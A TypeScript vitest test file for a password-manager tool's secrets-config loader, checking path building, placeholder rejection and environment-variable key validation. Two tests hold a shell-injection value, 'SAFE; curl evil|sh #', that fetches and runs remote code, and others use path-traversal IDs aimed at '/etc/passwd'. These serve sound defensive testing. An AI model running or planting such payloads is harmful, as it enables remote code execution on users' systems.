import { afterEach, describe, expect, it } from "vitest";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { getPasswordPath, loadSecretsConfig } from "../../lib/secrets-config";

let tempDirs: string[] = [];

afterEach(() => {
  for (const dir of tempDirs) {
    rmSync(dir, { recursive: true, force: true });
  }
  tempDirs = [];
});

function writeConfigFile(contents: string): string {
  const dir = mkdtempSync(join(tmpdir(), "psso-secrets-config-"));
  tempDirs.push(dir);
  const filePath = join(dir, ".passwd-sso-env.json");
  writeFileSync(filePath, contents, "utf-8");
  return filePath;
}

describe("getPasswordPath", () => {
  it("returns /api/v1/ path when useV1 is true", () => {
    expect(getPasswordPath("entry-1", true)).toBe(
      "/api/v1/passwords/entry-1",
    );
  });

  it("returns /api/ path when useV1 is false", () => {
    expect(getPasswordPath("entry-1", false)).toBe("/api/passwords/entry-1");
  });

  it("encodes special characters in entryId", () => {
    expect(getPasswordPath("entry with spaces", true)).toBe(
      "/api/v1/passwords/entry%20with%20spaces",
    );
  });

  it("rejects entryId with forward slash", () => {
    expect(() => getPasswordPath("../etc/passwd", true)).toThrow(
      "Invalid entry ID",
    );
  });

  it("rejects entryId with backslash", () => {
    expect(() => getPasswordPath("..\\etc\\passwd", true)).toThrow(
      "Invalid entry ID",
    );
  });

  it("allows cuid-style IDs", () => {
    expect(getPasswordPath("cm1abc2def3gh4ijk5l", false)).toBe(
      "/api/passwords/cm1abc2def3gh4ijk5l",
    );
  });
});

describe("loadSecretsConfig", () => {
  it("rejects placeholder dummy entry IDs", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        DATABASE_URL: { entry: "dummy-entry-id", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow(
      "uses placeholder entry ID",
    );
  });

  it("rejects angle-bracket placeholder entry IDs", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        DATABASE_URL: { entry: "<entry-id-from-vault>", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow(
      'placeholder entry ID "<entry-id-from-vault>"',
    );
  });

  it("accepts a concrete entry mapping", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        DATABASE_URL: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(loadSecretsConfig(filePath)).toEqual({
      secrets: {
        DATABASE_URL: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    });
  });

  it("rejects a shell-injection payload in the config key", () => {
    const payload = "SAFE; curl evil|sh #";
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        [payload]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow(
      "must be a valid environment variable name",
    );
  });

  it("does not echo the injection payload in the error message", () => {
    const payload = "SAFE; curl evil|sh #";
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        [payload]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    let message: string | undefined;
    try {
      loadSecretsConfig(filePath);
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }
    // Guard against a vacuous pass: an error MUST have been raised with a
    // non-empty message. Only then is "does not contain the payload" meaningful.
    expect(message).toBeDefined();
    expect(message?.length).toBeGreaterThan(0);
    expect(message).not.toContain(payload);
  });

  it("rejects a config key longer than 128 characters", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        // 129 chars → over the 128 cap.
        ["A".repeat(129)]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow("too long");
  });

  it("accepts a config key exactly 128 characters long", () => {
    // Boundary: 128 is valid; guards against an off-by-one regression to >= 128.
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        ["A".repeat(128)]: { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).not.toThrow();
  });

  it("rejects a config key starting with a digit", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        "1FOO": { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow(
      "must be a valid environment variable name",
    );
  });

  it("rejects a config key containing a hyphen", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        "A-B": { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow(
      "must be a valid environment variable name",
    );
  });

  it("rejects an empty config key", () => {
    const filePath = writeConfigFile(JSON.stringify({
      secrets: {
        "": { entry: "cm1abc2def3gh4ijk5l", field: "password" },
      },
    }));

    expect(() => loadSecretsConfig(filePath)).toThrow(
      "must be a valid environment variable name",
    );
  });
});
